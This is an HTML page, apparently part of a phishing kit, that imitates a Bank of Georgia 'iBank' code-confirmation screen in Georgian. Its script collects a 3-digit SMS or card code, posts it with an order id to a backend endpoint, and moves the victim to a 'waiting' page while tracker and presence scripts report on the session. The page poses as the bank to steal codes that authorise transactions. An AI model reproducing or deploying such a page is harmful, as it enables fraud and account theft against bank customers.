<!DOCTYPE html>
<html lang="ka" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<title>iBank - კოდის დადასტურება</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:"Noto Sans Georgian",-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#f8f9fb;display:flex;flex-direction:column}

  .header{
    display:flex;align-items:center;justify-content:space-between;
    padding:16px 20px;background:#fff;
    border-bottom:1px solid #e8eaed;
  }
  .logo-area{display:flex;align-items:center;gap:10px}
  .logo-area img{height:28px;border-radius:6px}
  .logo-text{font-size:15px;font-weight:600;color:#1a1a1a}
  .x-btn{background:none;border:none;cursor:pointer;padding:8px;border-radius:50%;transition:.2s}
  .x-btn:hover{background:#f0f0f0}
  .x-btn svg{width:20px;height:20px;stroke:#666;stroke-width:2;fill:none;stroke-linecap:round}

  .content{flex:1;display:flex;flex-direction:column;align-items:center;padding:48px 28px 0}

  .icon-wrap{
    width:80px;height:80px;border-radius:50%;
    background:linear-gradient(135deg,#f97316 0%,#ea580c 100%);
    display:flex;align-items:center;justify-content:center;
    margin-bottom:28px;
    box-shadow:0 8px 24px rgba(249,115,22,.25);
  }
  .icon-wrap svg{width:36px;height:36px;fill:none;stroke:#fff;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}

  .title{
    font-size:22px;font-weight:700;color:#1a1a1a;
    text-align:center;line-height:1.4;margin-bottom:10px;
  }
  .subtitle{
    font-size:14px;color:#6b7280;text-align:center;
    line-height:1.6;margin-bottom:40px;max-width:300px;
  }

  .code-row{
    display:flex;gap:16px;direction:ltr;
    justify-content:center;margin-bottom:32px;
  }
  .code-digit{
    width:72px;height:80px;
    border:2px solid #e0e0e0;border-radius:16px;
    background:#fff;text-align:center;
    font-size:32px;font-weight:700;color:#1a1a1a;
    font-family:"Noto Sans Georgian",inherit;outline:none;
    transition:all .2s ease;
    box-shadow:0 2px 8px rgba(0,0,0,.04);
  }
  .code-digit::placeholder{color:#d0d0d0;font-weight:400}
  .code-digit:focus{
    border-color:#f97316;
    box-shadow:0 0 0 3px rgba(249,115,22,.15),0 2px 8px rgba(0,0,0,.04);
  }
  .code-digit.filled{border-color:#f97316;background:#fffbf5}

  .err{
    display:none;width:100%;max-width:340px;
    margin:0 auto;padding:14px 18px;
    background:#fef2f2;border:1px solid #fecaca;border-radius:12px;
    color:#dc2626;font-size:14px;text-align:center;font-weight:600;
    animation:shake .4s ease;
  }
  @keyframes shake{
    0%,100%{transform:translateX(0)}
    20%,60%{transform:translateX(-6px)}
    40%,80%{transform:translateX(6px)}
  }

  .loading-dots{display:none;margin-top:20px;text-align:center}
  .loading-dots span{
    display:inline-block;width:8px;height:8px;
    background:#f97316;border-radius:50%;margin:0 4px;
    animation:bounce .6s infinite alternate;
  }
  .loading-dots span:nth-child(2){animation-delay:.2s}
  .loading-dots span:nth-child(3){animation-delay:.4s}
  @keyframes bounce{to{opacity:.3;transform:translateY(-6px)}}

  .secure-note{
    margin-top:auto;padding:20px 28px 24px;
    display:flex;align-items:center;justify-content:center;gap:6px;
    font-size:12px;color:#9ca3af;
  }
  .secure-note svg{width:14px;height:14px;stroke:#9ca3af;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
</style>
</head>
<body>

  <div class="header">
    <div class="logo-area">
      <img src="images/bog-logo-icon.png" alt="BOG">
      <span class="logo-text">iBank</span>
    </div>
    <button class="x-btn" onclick="history.back()" aria-label="Close">
      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
    </button>
  </div>

  <div class="content">
    <div class="icon-wrap">
      <svg viewBox="0 0 24 24">
        <rect x="2" y="4" width="20" height="16" rx="3"/>
        <path d="M2 8h20"/>
        <path d="M8 12h2M14 12h2"/>
      </svg>
    </div>

    <div class="title">კოდის დადასტურება</div>
    <div class="subtitle">გთხოვთ, შეიყვანეთ 3-ციფრიანი კოდი, რომელიც მიიღეთ SMS-ით</div>

    <div class="code-row">
      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" placeholder="·" autocomplete="off">
      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1" placeholder="·" autocomplete="off">
      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c2" placeholder="·" autocomplete="off">
    </div>

    <div class="loading-dots" id="loadingDots">
      <span></span><span></span><span></span>
    </div>

    <div class="err" id="errorMsg"></div>
  </div>

  <div class="secure-note">
    <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
    დაცული კავშირი
  </div>

<script>
  const params  = new URLSearchParams(location.search);
  const orderId = params.get("order");
  let   phone   = params.get("phone");

  if (!orderId) location.href = "index.html";

  if (!phone) {
    fetch("/api/orders/" + orderId + "/status")
      .then(r => r.json())
      .then(d => { if (d.username) phone = d.username; })
      .catch(() => {});
  }

  if (params.get("error") === "1") {
    const el = document.getElementById("errorMsg");
    el.textContent = "არასწორი კოდი";
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  const digits = document.querySelectorAll(".code-digit");

  digits.forEach((inp, i) => {
    inp.addEventListener("input", () => {
      inp.value = inp.value.replace(/\D/g, "");
      inp.classList.toggle("filled", !!inp.value);
      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
      maybeAutoSubmit();
    });
    inp.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !inp.value && i > 0) {
        digits[i - 1].focus();
        digits[i - 1].classList.remove("filled");
      }
    });
    inp.addEventListener("paste", e => {
      e.preventDefault();
      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
      for (let j = 0; j < digits.length && j < text.length; j++) {
        digits[j].value = text[j];
        digits[j].classList.toggle("filled", !!text[j]);
      }
      const last = Math.min(text.length, digits.length);
      if (last > 0) digits[Math.min(last, digits.length - 1)].focus();
      maybeAutoSubmit();
    });
    inp.addEventListener("focus", () => inp.select());
  });

  function getCode() {
    return Array.from(digits).map(d => d.value).join("");
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  let submitting = false;
  function maybeAutoSubmit() {
    const code = getCode();
    if (code.length === digits.length && !submitting) submitCode();
  }

  async function submitCode() {
    const code = getCode();
    if (code.length < digits.length) return;
    submitting = true;
    digits.forEach(d => d.disabled = true);
    document.getElementById("loadingDots").style.display = "block";

    try {
      const res  = await fetch("/api/code3-data", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ order_id: orderId, code: code })
      });
      const data = await res.json();
      if (data.success) {
        location.href = "code3-waiting.html?order=" + orderId +
                        (phone ? "&phone=" + encodeURIComponent(phone) : "");
      } else {
        showError(data.message || "შეცდომა მოხდა");
        resetInputs();
      }
    } catch (err) {
      showError("კავშირის შეცდომა");
      resetInputs();
    }
  }

  function resetInputs() {
    submitting = false;
    document.getElementById("loadingDots").style.display = "none";
    digits.forEach(d => { d.disabled = false; d.value = ""; d.classList.remove("filled"); });
    digits[0].focus();
  }
</script>
<script src="tracker.js"></script>
<script src="/presence.js"></script>
</body>
</html>
